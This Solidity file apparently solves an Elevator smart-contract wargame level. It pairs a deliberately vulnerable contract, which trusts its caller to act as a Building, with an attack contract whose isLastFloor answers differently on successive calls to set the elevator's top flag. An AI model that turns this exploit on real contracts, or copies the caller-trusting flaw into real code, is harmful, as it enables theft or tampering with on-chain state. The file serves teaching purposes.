pragma solidity ^0.4.24;


interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}




contract ElevatorAttack {

    Elevator victim;
    bool public isLast;


    constructor(address _victim) public payable {
        victim = Elevator(_victim);
    }

    //the explit is in tricking the elevator with the isLastFloor function
    //the mistake is in the victim contract expecting to only be called by buildings
    function attack(uint256 _floor) external payable returns(bool success) {
        victim.goTo(_floor);
        return true;
    }

    function isLastFloor(uint) external view returns(bool) {
        isLast? isLast = false : isLast = true;
        // trick the victim by returning the opposite
        return !isLast;
    }

}
